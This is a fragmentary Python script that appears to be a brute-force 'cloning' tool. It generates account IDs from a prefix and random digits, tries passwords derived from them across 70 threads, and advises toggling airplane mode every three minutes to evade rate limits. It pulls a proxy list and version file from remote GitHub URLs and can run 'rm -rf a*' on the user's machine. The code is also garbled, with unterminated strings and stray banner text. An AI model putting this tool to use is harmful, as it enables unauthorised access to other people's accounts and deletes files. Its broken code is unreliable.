 #coding=utf
import os
print(first subscribe my channel'')
...
[‽] TYPE.      :RANDOM
[*] WAIT AND SEE RESULT
[-]IF IDS NOT COME SO PLEASE NOT MIND
...
cps = []
try:
    print('\n\033[1;37m[•] WAIT KRY SIR TOOL LOAD HO RHA HAI🥺)
    proxy = requests.get('https://raw.githubusercontent.com/Ramxantanha/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/Ramxantanha/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
...
def svn_digit():
	...
	with ThreadPool(max_workers=70) as yaari:
		...
		print('\x1b[1;97m[•] Use FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 3MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,kode+guru]
